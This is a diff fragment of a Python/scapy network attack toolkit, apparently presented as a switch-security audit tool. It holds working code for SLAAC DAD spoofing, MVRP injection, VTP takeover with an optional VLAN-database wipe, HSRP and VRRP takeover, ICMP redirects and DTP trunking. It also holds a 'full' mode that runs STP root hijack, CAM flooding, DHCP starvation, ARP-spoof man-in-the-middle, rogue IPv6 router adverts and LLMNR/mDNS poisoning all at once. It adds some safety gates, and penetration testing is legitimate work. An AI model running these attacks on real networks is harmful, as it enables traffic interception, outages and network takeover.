+        print(f"  -> sending {len(frags)} frame(s): {label}")
+        sendp(frags, iface=iface, count=args.count, inter=2, verbose=0)
+    print("[*] verdict: any RA that a victim ACCEPTS from this port proves "
+          "the first-hop protections (RA-Guard/DHCPv6 Guard/snooping) fail. "
+          "Old cohort of victims self-purges the doc-space prefix in 300s")
+
+
+# ---------------------------------------------------------------- daddos
+
+
+def daddos_cmd(args):
+    """SLAAC DAD spoofing (RFC 4862 §5.4.5 race; THC-IPv6 dos-new-ip6
+    pattern). Answer every tentative DAD NS with an Override NA so the
+    victim aborts the tentative address. Harm while running ONLY: the
+    victim re-tries + succeeds shortly after we stop."""
+    need_root()
+    iface = args.iface
+    mymac = my_mac(iface)
+    print(f"[*] DAD poison on {iface}: every tentative address gets an "
+          "existing claim (N solo: prefix and SLAAC addresses blocked for "
+          f"victims while running)")
+    n = [0]
+
+    def dad(p):
+        if not p.haslayer(ICMPv6ND_NS):
+            return
+        ip6 = p[IPv6]
+        if ip6.src != "::" or not ip6.dst.startswith("ff02::"):
+            return
+        tgt = p[ICMPv6ND_NS].tgt
+        na = (Ether(src=mymac, dst=p[Ether].src) /
+              IPv6(src=tgt, dst="ff02::1", hlim=255) /
+              ICMPv6ND_NA(R=0, S=0, O=1, tgt=tgt) /
+              ICMPv6NDOptDstLLAddr(lladdr=mymac))
+        sendp(na, iface=iface, verbose=0)
+        n[0] += 1
+        if n[0] <= 20 or n[0] % 50 == 0:
+            print(f"  > DAD for {tgt} blocked ({n[0]})")
+
+    try:
+        sniff(iface=iface, filter="icmp6", timeout=args.time or None,
+              store=False, prn=dad)
+    except KeyboardInterrupt:
+        pass
+    print(f"[*] stopped: {n[0]} tentative addresses blocked; victims' "
+          "next SLAAC/DHCPv6 retry succeeds")
+
+
+# ---------------------------------------------------------------- mvrp
+
+
+def mvrp_cmd(args):
+    """MVRP/GVRP injection (IEEE 802.1Qak, no maintained public tool).
+    JoinIn registers VLAN(s) dynamically on MVRP-aware ports; validation:
+    remote switch shows the VLAN as dynamically registered. LeaveAll churn
+    is DoS-class and excluded."""
+    need_root()
+    pif = parent_of(args.iface)
+    mymac = my_mac(pif)
+    vids = parse_vlan_list(args.vlans)
+    # MVRP (per wireshark packet-mrp-mvrp.c): ProtocolVersion(1)=0, then
+    # per message: AttributeType(1)=1 VID, AttributeLength(1)=4,
+    # VectorHeader(2): LeaveAllEvent(3b)|NumberOfValues(13b),
+    # FirstValue(2), ThreePackedEvents(1 per 3 values, hi2 bits first:
+    # JoinEmpty=1 JoinIn=2 LeaveEmpty=3 LeaveIn=4 New=5), EndMark(2)=0x0000
+    event = 2 if args.join else 3  # JoinIn vs LeaveEmpty
+    msgs = b""
+    for v in vids:
+        vh = (0 << 13) | 1
+        msg = (struct.pack("!BB", 1, 4) +
+               struct.pack("!H", vh) +
+               struct.pack("!H", v) +
+               bytes([event << 6]) +
+               b"\x00\x00")
+        msgs += msg
+    pdu = bytes([0]) + msgs
+    f = (Ether(dst="01:80:c2:00:00:21", src=mymac, type=0x88F5) /
+         Raw(pdu))
+    print(f"[*] MVRP {'JoinIn' if args.join else 'LeaveEmpty'} on {pif} "
+          f"for VLAN(s) {', '.join(map(str, vids))} x{args.count}")
+    print("    validate: remote switch 'show mvrp '+ VLAN dynamic state; "
+          "rare protocol - if gear ignores it, that IS the passing audit "
+          "result")
+    sendp(f, count=args.count, inter=args.interval, iface=pif, verbose=0)
+
+
+# ---------------------------------------------------------------- ghost
+
+
+def ghost_cmd(args):
+    """'Ghost frames' proof (reserved group MAC as SOURCE: forward-but-
+    never-learn on non-conformant silicon; 802.3 §3.2.6 violation).
+    No dedicated public tool exists - scapy PoC: send sentinel frames with
+    ghost SA from the attack leg, confirm receipt on the watch leg; a
+    frame that is forwarded but can never be taught to the CAM table is
+    invisible to NAC/IP-device-tracking/port-security accounting."""
+    need_root()
+    pif = parent_of(args.iface)
+    watch = args.watch
+    if not watch or not iface_exists(watch):
+        die("ghost observes frames crossing the fabric: pass a watch leg "
+            "with -w <iface>")
+    ghost_sa = args.ghost_sa
+    sentinel = args.sentinel
+
+    got = {"n": 0}
+
+    def hit(p):
+        if p.haslayer(Ether) and p[Ether].src.lower() == ghost_sa.lower():
+            got["n"] += 1
+
+    sn = AsyncSniffer(iface=watch, prn=hit)
+    sn.start()
+    time.sleep(0.5)
+    if args.traverse:
+        # traversal probes through unmanaged relays that should filter
+        # reserved dsts: worst-priority STP (harmless, prio 0xF000) and
+        # LLDP raw probe to the -0E group dst.
+        wroot = rand_mac()
+        worst = (Ether(dst="01:80:c2:00:00:00", src=ghost_sa) /
+                 LLC(dsap=0x42, ssap=0x42, ctrl=3) /
+                 STP(rootid=0xF000, rootmac=wroot, bridgeid=0xF000,
+                     bridgemac=wroot, age=0))
+        lldp = (Ether(dst="01:80:c2:00:00:0e", src=ghost_sa,
+                      type=0x88CC) / f"GHOST-TRAVERSAL {sentinel}".encode())
+        f = [worst, lldp]
+        note = "traversal probes (worst-prio STP + LLDP -0E)"
+    else:
+        eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=ghost_sa, type=0x88B5)
+        if args.vlan:
+            eth = eth / Dot1Q(vlan=args.vlan)
+        f = eth / f"GHOST-PROBE {sentinel}".encode()
+        note = f"BUM ghost frames ethertype 0x88B5 (experimental/inert)"
+    print(f"[*] ghost SA {ghost_sa}: {note} on {pif} x{args.count} @ "
+          f"{args.rate}pps - observing on {watch}")
+    interval = 1.0 / max(args.rate, 0.1)
+    n_sent = 0
+    for _ in range(args.count):
+        sendp(f, iface=pif, verbose=0)
+        n_sent += 1
+        time.sleep(interval)
+    time.sleep(2)
+    sn.stop()
+    print(f"[*] {got['n']}/{n_sent} ghost frames observed on the watch leg")
+    if got["n"]:
+        print("[!] FORWARDED from an ILLEGAL group-MAC source - if the "
+              "switch CAM table shows no entry for this SA (verify: "
+              "'show mac address-table | i 0180.c200' / bridge fdb), the "
+              "learn/forward mismatch is PROVEN: traffic traverses while "
+              "identity is untrackable (NAC, port-security, IPDT bypass)")
+    else:
+        print("[*] not forwarded - DUT filters group-MAC sources "
+              "(conformant 802.3/802.1Q behavior)")
+    print("[*] destructive neighbours intentionally NOT implemented: "
+          "802.3x PAUSE floods (queue freeze), EAPOL-Logoff deauth, "
+          "priority-BPDU storms")
+
+
+# ---------------------------------------------------------------- vtp
+
+
+def _vtp_envelope(m, body):
+    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
+            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
+            SNAP(OUI=0x00000C, code=0x2003) / body)
+
+
+def vtp_vlan_records(vlans):
+    """vlans: [(id, name), ...] -> subset-advert VLAN-info records.
+    Layout per Wireshark packet-vtp.c: len(1) status(1) type(1) name_len(1)
+    isl_vlan_id(2) mtu(2) dot10_said(4)=100000+id, name padded to 4."""
+    out = b""
+    for vid, name in vlans:
+        nb = name.encode()
+        npad = (len(nb) + 3) & ~3
+        out += struct.pack("!BBBBHHI", 12 + npad, 0, 1, len(nb), vid,
+                           1500, 0x100000 + vid) + nb.ljust(npad, b"\x00")
+    return out
+
+
+def vtp_summary(m, domain, revision, updater="0.0.0.0", version=1,
+                followers=0, vlan_records=b""):
+    """Summary advert with recomputed MD5. Digest per yersinia
+    vtp_generate_md5(): md5( zeros(16) || summary_struct(digest zeroed)
+    || vlan_records || zeros(16) ) - valid only WITHOUT a VTP password."""
+    dom = domain.encode()
+    db = dom[:32].ljust(32, b"\x00")
+    ts = time.strftime("%y%m%d%H%M%S", time.gmtime()).encode()
+    body = (struct.pack("!BBBB", version, 0x01, followers, len(dom)) + db +
+            struct.pack("!II", revision,
+                        int(ipaddress.IPv4Address(updater))) + ts +
+            b"\x00" * 16)
+    digest = hashlib.md5(b"\x00" * 16 + body + vlan_records +
+                         b"\x00" * 16).digest()
+    body = body[:56] + digest
+    return _vtp_envelope(m, body)
+
+
+def vtp_subset(m, domain, revision, vlans, version=1, seq=1):
+    dom = domain.encode()
+    body = (struct.pack("!BBBB", version, 0x02, seq, len(dom)) +
+            dom[:32].ljust(32, b"\x00") +
+            struct.pack("!I", revision) + vtp_vlan_records(vlans))
+    return _vtp_envelope(m, body)
+
+
+def vtp_request(m, domain, start_val=0, version=1):
+    dom = domain.encode()
+    body = (struct.pack("!BBBB", version, 0x03, 0, len(dom)) +
+            dom[:32].ljust(32, b"\x00") + struct.pack("!H", start_val))
+    return _vtp_envelope(m, body)
+
+
+def vtp_cmd(args):
+    """VTP takeover. SAFE default: raise the domain's config revision by one
+    and never answer the resulting Advertisement Requests - client requests
+    arriving is the proof the domain would accept a hostile update.
+    --wipe/--set are DESTRUCTIVE (answers requests with chosen VLAN db)."""
+    need_root()
+    pif = parent_of(args.iface)
+    m = my_mac(pif)
+    domain = args.domain
+    rev = args.rev
+
+    if domain is None or rev is None:
+        print(f"[*] sniffing {args.time}s on {pif} for VTP summary "
+              "(domain + config revision)...")
+        got = {}
+
+        def learn(p):
+            try:
+                dp = Dot3(bytes(p))
+            except Exception:
+                return
+            if not (dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0)
+                    == 0x00000C and dp[SNAP].code == 0x2003):
+                return
+            body = bytes(dp[SNAP].payload)
+            if len(body) > 56 and body[1] == 0x01:  # summary advert
+                dlen = body[3]
+                if dlen and 4 + dlen <= len(body):
+                    got["domain"] = body[4:4 + dlen].decode(
+                        errors="replace").rstrip("\x00")
+                    got["rev"] = struct.unpack("!I", body[36:40])[0]
+                    got["version"] = body[0]
+
+        sniff(iface=pif, timeout=args.time, store=False, prn=learn)
+        if "domain" not in got:
+            die("no VTP summary seen; pass --domain/--rev explicitly "
+                "(or verify the domain participates in VTP v1/v2)")
+        domain = domain or got["domain"]
+        rev = rev if rev is not None else got["rev"] + 1
+        version = got["version"]
+        print(f"[*] learned: domain {domain!r} rev {got['rev']} "
+              f"version {version} -> attacking revision {rev}")
+    else:
+        version = 1
+
+    harmful = args.wipe or args.set is not None
+    if harmful and not args.i_know:
+        die("refusing DESTRUCTIVE VTP rewrite without --i-know "
+            "(this overwrites the domain's VLAN database; lab only)")
+
+    # safe phase: spoof adv request first (passive proof of membership)
+    print(f"[*] sending adv-request (start 0) in domain {domain!r} "
+          "- summaries in reply prove domain membership")
+    sendp(vtp_request(m, domain, 0, version), iface=pif, count=3, inter=1,
+          verbose=0)
+
+    summary = vtp_summary(m, domain, rev, version=version, followers=0)
+    print(f"[*] hostile summary: rev={rev} (sniffed+1), followers=0, "
+          "recomputed MD5 (no-password domains only)")
+    reqs = []
+
+    subset_for = None
+    if harmful:
+        vlans = []
+        if args.set:
+            for spec in args.set:
+                if ":" in spec:
+                    v, n = spec.split(":", 1)
+                else:
+                    v, n = spec, f"vlan{spec}"
+                vlans.append((int(v), n))
+        subset_for = vtp_subset(m, domain, rev, vlans, version=version)
+        print(f"[!] DESTRUCTIVE: answering adv-requests with subset of "
+              f"{len(vlans)} VLAN(s){' (EMPTY = DB WIPE)' if not vlans else ''}")
+
+    stop = threading.Event()
+
+    def listen(p):
+        try:
+            dp = Dot3(bytes(p))
+        except Exception:
+            return
+        if not (dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0)
+                == 0x00000C and dp[SNAP].code == 0x2003):
+            return
+        body = bytes(dp[SNAP].payload)
+        if len(body) > 40 and body[1] == 0x01:
+            got_rev = struct.unpack("!I", body[36:40])[0]
+            print(f"    < summary from {p.src} rev={got_rev}"
+                  + (" << we are now authoritative" if got_rev >= rev
+                     else ""))
+        elif len(body) > 40 and body[1] == 0x03:
+            start = struct.unpack("!H", body[38:40])[0]
+            reqs.append(p.src)
+            print(f"    < ADVERTISEMENT REQUEST from {p.src} "
+                  f"(start_val={start}) => domain ACCEPTED our revision")
+            if harmful and subset_for is not None:
+                sendp(subset_for, iface=pif, verbose=0)
+                print(f"      > destructive subset sent to overwrite "
+                      "their VLAN db")
+    sn = AsyncSniffer(iface=pif, prn=listen)
+    sn.start()
+
+    try:
+        for _ in range(args.time):
+            sendp(summary, iface=pif, verbose=0)
+            time.sleep(1.5)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        sn.stop()
+    uniq = sorted({r for r in reqs})
+    print(f"[*] done: {len(reqs)} advertisement request(s) from "
+          f"{len(uniq)} switch(es): {', '.join(uniq) if uniq else 'none'}")
+    if uniq and not harmful:
+        print("[*] PROVEN: switches accepted our higher revision and asked "
+              "for our VLAN db - a hostile subset would have rewritten it "
+              "(rerun with --set/--wipe --i-know to demonstrate)")
+    elif not uniq:
+        print("[*] no adv-requests: VTP password set (digest mismatch) / "
+              "listen window short / transparent-mode domain")
+
+
+# ---------------------------------------------------------------- hsrp
+
+
+def hsrp_cmd(args):
+    need_root()
+    if not HAVE_HSRP:
+        die("scapy HSRP layer unavailable")
+    iface = args.iface
+    myip = my_ip(iface)
+    grp, vip = args.group, args.vip
+    print(f"[*] HSRP coup on {iface}: group {grp} vip {vip}, prio 255")
+    base = IP(src=myip, dst="224.0.0.2") / UDP(sport=1985, dport=1985)
+    sendp(base / HSRP(opcode=1, state=16, priority=255, group=grp,
+                      auth=b"cisco\x00\x00\x00", virtualIP=vip),
+          iface=iface, verbose=0)
+    print("[*] ACTIVE hellos running; Ctrl-C resigns.")
+    try:
+        while True:
+            sendp(base / HSRP(opcode=0, state=16, priority=255, group=grp,
+                              auth=b"cisco\x00\x00\x00", virtualIP=vip),
+                  iface=iface, verbose=0)
+            time.sleep(3)
+    except KeyboardInterrupt:
+        sendp(base / HSRP(opcode=2, state=16, priority=255, group=grp,
+                          virtualIP=vip), iface=iface, verbose=0)
+        print("[*] resigned")
+
+# ---------------------------------------------------------------- icmpredirect
+
+
+def icmpredirect_cmd(args):
+    need_root()
+    iface = args.iface
+    myip = my_ip(iface)
+    gw = args.gateway or gateway_of(iface) or "172.16.0.1"
+    old_fwd = get_ip_forward()
+    set_ip_forward(True)
+    print(f"[*] ICMP redirects: {', '.join(args.targets)} -> route via {myip}")
+    try:
+        while True:
+            for t in args.targets:
+                for d in args.dest:
+                    p = (IP(src=gw, dst=t) / ICMP(type=5, code=1, gw=myip) /
+                         IP(src=t, dst=d) / UDP(dport=53))
+                    sendp(Ether() / p, iface=iface, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        set_ip_forward(old_fwd)
+        print("[*] stopped")
+
+# ---------------------------------------------------------------- full
+
+
+def dtp_frame(m, mode=0x03):
+    """DTP frame. TLV layout per Wireshark packet-dtp.c (validated against
+    US patent 6,445,715) and dtp-spoof:
+      version(1B)=0x01, TLVs = type(2)+len(2, incl hdr)+value:
+      0x0001 Domain | 0x0002 Trunk Status | 0x0003 Trunk Type | 0x0004 Neigh
+    Status byte: 0x81 trunk-on, 0x03 desirable, 0x04 auto, 0x02 access;
+    Type byte 0xA5 = negotiated/802.1Q. mode='trunk' (0x81) pretends our
+    port already IS a trunk - slips past ACL signatures keying on 0x03."""
+    def tlv(t, v):
+        return struct.pack("!HH", t, 4 + len(v)) + v
+    neigh = bytes(int(x, 16) for x in m.split(":"))
+    body = (b"\x01" +                    # protocol version
+            tlv(0x0001, b"\x00") +       # null domain
+            tlv(0x0002, bytes([mode])) +  # trunk status
+            tlv(0x0003, b"\xa5") +       # negotiated 802.1Q
+            tlv(0x0004, neigh))          # our MAC as neighbor
+    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
+            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
+            SNAP(OUI=0x00000C, code=0x2004) / body)
+
+
+def full_cmd(args):
+    """Full suite: recon, then every bounded attack at once, then every
+    recon-applicable follow-up module; rich findings-only report."""
+    need_root()
+    iface = args.iface
+    pif = parent_of(iface)
+    m = my_mac(iface)
+    gw = gateway_of(iface) or "172.16.0.1"
+    stop = threading.Event()
+
+    console.rule(f"[bold]FULL SUITE[/bold] - attack leg {iface} "
+                 f"({pif} untagged) - watch leg "
+                 f"{args.watch or 'none (single-leg)'}")
+
+    # ---- phase 1: recon
+    console.rule("[bold cyan]phase 1/4 - recon[/bold cyan]")
+    with console.status(f"[cyan]ARP sweep 172.16.0.0/24 on {iface} ...",
+                        spinner="dots"):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="172.16.0.0/24"),
+                     iface=iface, timeout=3, verbose=0)
+    hosts = sorted({r.psrc for s, r in ans if r.psrc != my_ip(iface)})
+    console.print(f"  [green]+[/green] ARP sweep done: {len(hosts)} host(s) "
+                  "answered" + (f": {', '.join(hosts)}" if hosts else ""))
+    ns = argparse.Namespace(**vars(args))
+    ns.time = args.scan_time
+    scan_box = {}
+
+    def run_scan():
+        try:
+            scan_box["r"] = scan_cmd(ns)
+        except BaseException as e:  # keep the spinner honest
+            scan_box["err"] = e
+
+    scan_th = threading.Thread(target=run_scan, daemon=True)
+    scan_th.start()
+    t0 = time.time()
+    with console.status("", spinner="earth") as st:
+        while scan_th.is_alive():
+            left = max(args.scan_time - int(time.time() - t0), 0)
+            st.update(f"[cyan]passive scan: {left}s left "
+                      "(each protocol announced on first sight)")
+            time.sleep(0.5)
+    scan_th.join()
+    if "err" in scan_box:
+        raise scan_box["err"]
+    recon = scan_box["r"]
+
+    # evidence sniffer on the WATCH leg: anything seen there crossed the
+    # fabric; BPDUs there carry the authoritative current root.
+    ev = {"randmac": 0, "garp": 0, "offers": 0, "roots": set(),
+          "us_root": False, "ra": 0}
+    if args.watch and iface_exists(args.watch):
+        wlegs = list(dict.fromkeys([args.watch, parent_of(args.watch)]))
+    else:
+        wlegs = []
+    myaddr = my_mac(iface).lower()
+
+    def ev_pkt(p):
+        try:
+            dp = Dot3(bytes(p))
+        except Exception:
+            dp = p
+        if dp.haslayer(STP):
+            rm = str(dp[STP].rootmac).lower()
+            ev["roots"].add(rm)
+            if rm != "00:00:00:00:00:00" and rm == myaddr:
+                ev["us_root"] = True
+        if p.haslayer(Ether) and p[Ether].src.startswith("02:"):
+            ev["randmac"] += 1
+        if p.haslayer(ARP) and p[ARP].op == 2 and \
+                p[ARP].psrc == gw and p[ARP].hwsrc.lower() == myaddr:
+            ev["garp"] += 1
+        if p.haslayer(ICMPv6ND_RA) and p.haslayer(Ether) and \
+                p[Ether].src.lower() == myaddr:
+            ev["ra"] += 1
+        if p.haslayer(BOOTP) and p[BOOTP].op == 2 and p.haslayer(DHCP):
+            for o in p[DHCP].options:
+                if isinstance(o, tuple) and o[0] == DHCP_MT \
+                        and o[1] == 2:
+                    ev["offers"] += 1
+
+    ev_thread = None
+    if wlegs:
+
+        def ev_sniff():
+            sniff(iface=wlegs, timeout=args.duration + 4, store=False,
+                  prn=ev_pkt)
+
+        ev_thread = threading.Thread(target=ev_sniff, daemon=True)
+        ev_thread.start()
+    else:
+        console.print("  [dim]no -w watch leg: traversal evidence "
+                      "disabled; verdicts based on recon and send-side "
+                      "only[/dim]")
+    counters = {}
+
+    # ---- phase 2: attacks, all at once, bounded by --duration
+    console.print("  [dim]Ctrl-C stops all workers and restores ARP[/dim]")
+    old_fwd = get_ip_forward()
+    set_ip_forward(True)
+
+    macs = {}
+    if not args.no_spoof:
+        for t in hosts + [gw]:
+            r = resolve_mac(t, iface, retries=2)
+            if r:
+                macs[t] = r
+
+    def w_stp():
+        untag, tag = stp_frames(my_mac(pif), 0, tag=args.stp_tag)
+        n = 0
+        while not stop.is_set():
+            sendp(untag, iface=pif, verbose=0)
+            if tag:
+                sendp(tag, iface=pif, verbose=0)
+            n += 1
+            counters["stp"] = n
+            stop.wait(0.5)
+        counters["stp"] = n
+        print(f"      [stp]   {n} BPDU bursts sent (claimed root, prio 0)")
+
+    def w_cam():
+        sock = conf.L2socket(iface=iface)
+        base = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / \
+            UDP(dport=9) / b"l2-flood"
+        n = 0
+        while not stop.is_set():
+            p = Ether(bytes(base))
+            p.src = rand_mac()
+            sock.send(p)
+            n += 1
+            counters["cam"] = n
+        counters["cam"] = n
+        print(f"      [cam]   {n} random-MAC frames sent (CAM exhaustion)")
+
+    def w_dhcp():
+        n = 0
+        while not stop.is_set():
+            mac = rand_mac()
+            chaddr = int(mac.replace(":", ""), 16).to_bytes(6, "big") + \
+                b"\x00" * 10
+            sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                  IP(src="0.0.0.0", dst="255.255.255.255") /
+                  UDP(sport=68, dport=67) /
+                  BOOTP(chaddr=chaddr, xid=random.randint(0, 0xFFFFFFFF)) /
+                  DHCP(options=[(DHCP_MT, "discover"), "end"]),
+                  iface=iface, verbose=0)
+            n += 1
+            counters["dhcp"] = n
+            stop.wait(0.02)
+        counters["dhcp"] = n
+        print(f"      [dhcp]  {n} forged discovers sent (pool starvation)")
+
+    def w_gra():
+        p = Ether(dst="ff:ff:ff:ff:ff:ff", src=m) / \
+            ARP(op=2, psrc=gw, hwsrc=m, pdst=gw,
+                hwdst="ff:ff:ff:ff:ff:ff")
+        n = 0
+        while not stop.is_set():
+            sendp(p, iface=iface, verbose=0)
+            n += 1
+            counters["garp"] = n
+            stop.wait(0.3)
+        counters["garp"] = n
+        print(f"      [garp]  {n} gratuitous ARPs claiming {gw}")
+
+    def w_dtp():
+        f = dtp_frame(my_mac(pif))
+        n = 0
+        while not stop.is_set():
+            sendp(f, iface=pif, verbose=0)
+            n += 1
+            counters["dtp"] = n
+            stop.wait(5)
+        counters["dtp"] = n
+        print(f"      [dtp]   {n} trunk-negotiation frames sent")
+
+    spoof_targets = [t for t in hosts if t in macs and t != gw]
+
+    def w_spoof():
+        if not spoof_targets or gw not in macs:
+            print("      [spoof] no MACs resolved, skipped")
+            return
+        n = 0
+        while not stop.is_set():
+            for t in spoof_targets:
+                sendp(Ether(dst=macs[t]) /
+                      ARP(op=2, psrc=gw, hwsrc=m, pdst=t, hwdst=macs[t]),
+                      iface=iface, verbose=0)
+                if t != gw:
+                    sendp(Ether(dst=macs[gw]) /
+                          ARP(op=2, psrc=t, hwsrc=m, pdst=gw,
+                              hwdst=macs[gw]), iface=iface, verbose=0)
+            n += 1
+            counters["spoof"] = n
+            stop.wait(1.0)
+        counters["spoof"] = n
+        print(f"      [spoof] {n} poison rounds on {len(spoof_targets)} hosts - "
+              "restoring ARP caches...")
+        for t in spoof_targets:
+            if gw in macs:
+                sendp(Ether(dst=macs[t]) /
+                      ARP(op=2, psrc=gw, hwsrc=macs[gw], pdst=t,
+                          hwdst=macs[t]), iface=iface, count=4, verbose=0)
+                if t != gw:
+                    sendp(Ether(dst=macs[gw]) /
+                          ARP(op=2, psrc=t, hwsrc=macs[t], pdst=gw,
+                              hwdst=macs[gw]), iface=iface, count=4,
+                          verbose=0)
+        print("      [spoof] restored")
+
+    # IPv6 rogue RA
+    ra_f = ra_frame(my_mac(iface), my_ll6(iface), my_ll6(iface),
+                    args.ra_prefix, 1800)
+
+    def w_ra():
+        n = 0
+        while not stop.is_set():
+            sendp(ra_f, iface=iface, verbose=0)
+            n += 1
+            counters["ra"] = n
+            stop.wait(3)
+        counters["ra"] = n
+        print(f"      [ra]    {n} rogue RAs sent (v6 gw+dns = this host)")
+
+    # LLMNR/NBT-NS/mDNS poisoner for the window
+    pois_stats = {"llmnr": 0, "nbns": 0, "mdns": 0}
+
+    def w_llmnr():
+        sniff(iface=iface,
+              filter="udp port 5355 or udp port 5353 or udp port 137",
+              timeout=args.duration + 2, store=False,
+              prn=make_poisoner(iface, my_ip(iface), my_ll6(iface),
+                                pois_stats))
+
+    # VRRP takeover for any detected vrids
+    vrrp_targets = {v: t for v, t in recon["vrrp"].items()
+                    if v is not None and t[2]}
+
+    def w_vrrp():
+        frames = [vrrp_frame(my_mac(iface), my_ip(iface), vrid, 255, t[2])
+                  for vrid, t in vrrp_targets.items()]
+        n = 0
+        while not stop.is_set():
+            sendp(frames, iface=iface, verbose=0)
+            n += 1
+            counters["vrrp"] = n
+            stop.wait(1.0)
+        counters["vrrp"] = n
+        print(f"      [vrrp]  {n} prio-255 adverts sent "
+              f"(vrids {', '.join(str(v) for v in vrrp_targets)})")
+
+    def w_dad():
+        n = [0]
+
+        def dad(p):
+            if not (p.haslayer(IPv6) and p.haslayer(ICMPv6ND_NS)):
+                return
+            if p[IPv6].src != "::":
+                return
+            tgt = p[ICMPv6ND_NS].tgt
+            sendp(Ether(src=m, dst=p[Ether].src) /
+                  IPv6(src=tgt, dst="ff02::1", hlim=255) /
+                  ICMPv6ND_NA(R=0, S=0, O=1, tgt=tgt) /
+                  ICMPv6NDOptDstLLAddr(lladdr=m), iface=iface, verbose=0)
+            n[0] += 1
+            counters["dad"] = n[0]
+
+        sniff(iface=iface, filter="icmp6", timeout=args.duration + 2,
+              store=False, prn=dad)
+        counters["dad"] = n[0]
+        print(f"      [dad]   {n[0]} tentative v6 address claim(s) blocked "
+              "(harm ends with the burst)")
+
+    workers = [w_stp, w_cam, w_dhcp, w_gra, w_dtp, w_ra, w_llmnr]
+    if recon.get("ra6"):
+        workers.append(w_dad)
+    if not args.no_spoof:
+        workers.append(w_spoof)
+    if vrrp_targets:
+        workers.append(w_vrrp)
+    threads = [threading.Thread(target=w, daemon=True) for w in workers]
+    for t in threads:
+        t.start()
+
+    def burst_view(elapsed):
+        rows = [
+            ("STP hijack", f"{counters.get('stp', 0)} BPDU bursts",
+             ("we ARE root now" if ev["us_root"]
+              else f"roots seen: {', '.join(sorted(ev['roots'])) or 'none'}")),
+            ("CAM exhaustion", f"{counters.get('cam', 0)} frames",
+             f"{ev['randmac']} flooded to watch leg"),
+            ("DHCP starve", f"{counters.get('dhcp', 0)} discovers",
+             f"{ev['offers']} server offers seen"),
+            ("grat-ARP", f"{counters.get('garp', 0)} claims of {gw}",
+             f"{ev['garp']} traversed"),
+            ("DTP offers", f"{counters.get('dtp', 0)} sent", ""),
+            ("rogue RA", f"{counters.get('ra', 0)} sent",
+             f"{ev['ra']} traversed"),
+            ("name poison",
+             f"{pois_stats['llmnr'] + pois_stats['nbns'] + pois_stats['mdns']}"
+             " queries answered", ""),
+        ]
+        if counters.get("spoof"):
+            rows.append(("ARP spoof", f"{counters['spoof']} rounds",
+                         f"{len(spoof_targets)} hosts <-> {gw}"))
+        if "vrrp" in counters:
+            rows.append(("VRRP coup", f"{counters['vrrp']} adverts", ""))
+        if "dad" in counters:
+            rows.append(("SLAAC DAD block", f"{counters['dad']} blocked", ""))
+        tbl = Table(box=None, pad_edge=False)
+        tbl.add_column("module", style="bold red", no_wrap=True)
+        tbl.add_column("sent", style="cyan")
+        tbl.add_column("watch-leg evidence", style="yellow")
+        for name, sent, evidence in rows:
+            tbl.add_row(name, sent, evidence)
+        filled = int(24 * elapsed / max(args.duration, 1))
+        bar = ("[green]" + "#" * filled + "[/green]"
+               + "[dim]" + "-" * (24 - filled) + "[/dim]")
+        tbl.add_row(f"{bar} {elapsed:.0f}/{args.duration}s", "", "")
+        return tbl
+
+    console.rule(f"[bold red]phase 2/4 - attack burst "
+                 f"({args.duration}s)[/bold red]")
+    try:
+        with Live(burst_view(0), console=console, refresh_per_second=8
+                  ) as live:
+            elapsed = 0.0
+            while elapsed < args.duration:
+                time.sleep(0.25)
+                elapsed += 0.25
+                live.update(burst_view(elapsed))
+    except KeyboardInterrupt:
+        console.print("\n[yellow]interrupted - stopping all workers")
+    stop.set()
+    for t in threads:
+        t.join()
+    set_ip_forward(old_fwd)
+    if ev_thread is not None:
+        ev_thread.join()
+
+    # ---- findings: only CONFIRMED issues make the report; resisted
+    # controls collapse into one roll-up line (no zero-count padding)
+    issues = []
+    resisted = []
+    skipped = []
+    pending = []
+
+    # recon-derived issues (evidence: frames actually seen on the wire)
+    if recon["hsrp"]:
+        for g, (prio, vip, state) in recon["hsrp"].items():
+            issues.append(("HIGH", f"HSRP group {g} (vip {vip}, prio "
+                                   f"{prio}) has unauthenticated election - "
+                                   "takeover: hsrp --vip "
+                                   f"{vip} --group {g}"))
+    if recon["cdp"]:
+        cdp = recon["cdp"]
+        extra = (f", native VLAN {cdp['native_vlan']} (doubletag surface)"
+                 if cdp.get("native_vlan") is not None else "")
+        issues.append(("MED", f"CDP disclosure: {cdp.get('device', '?')} "
+                              f"{cdp.get('platform', '')}{extra}".strip()))
+    if recon["lldp"]:
+        issues.append(("MED", f"LLDP topology disclosure ({recon['lldp']} "
+                              "frames)"))
+    if recon["ospf"]:
+        auths = "/".join(sorted(recon["ospf_auth"])) or "unknown"
+        issues.append(("MED", f"OSPF on the wire ({recon['ospf']} msgs, "
+                              f"auth {auths}) - LSA injection surface"))
+    if recon["eigrp"]:
+        issues.append(("MED", f"EIGRP on the wire ({recon['eigrp']} msgs) - "
+                              "no neighbor authentication apparent"))
+    for c in sorted(recon["conflicts"]):
+        issues.append(("HIGH", f"ARP conflict for {c[0]}: {c[1]} vs {c[2]} "
+                               "- spoofing already active on this segment"))
+    for bad in sorted(recon["bad_rdnss"]):
+        issues.append(("HIGH", f"malformed ICMPv6 RA option stream: {bad}"))
+    if recon["frag_nd"]:
+        issues.append(("HIGH", f"{recon['frag_nd']} fragmented ND frame(s) "
+                               "- RFC 6980 MUST-drop violated"))
+
+    # burst-derived verdicts (evidence: watch-leg sniffer during the burst)
+    if ev["us_root"]:
+        issues.append(("HIGH", "STP root takeover CONFIRMED - watch-leg "
+                               "BPDUs now name this host "
+                               f"({myaddr}) as root bridge"))
+    elif recon["stp"]:
+        root_txt = (", ".join(sorted(ev["roots"])) if ev["roots"]
+                    else "unseen (no BPDUs reached the watch leg)")
+        resisted.append(f"STP hijack (root unchanged: {root_txt})")
+    if counters.get("spoof"):
+        issues.append(("HIGH", f"ARP MITM on {len(spoof_targets)} host(s) "
+                               f"<-> {gw} ({counters['spoof']} poison "
+                               "rounds; caches restored on exit)"))
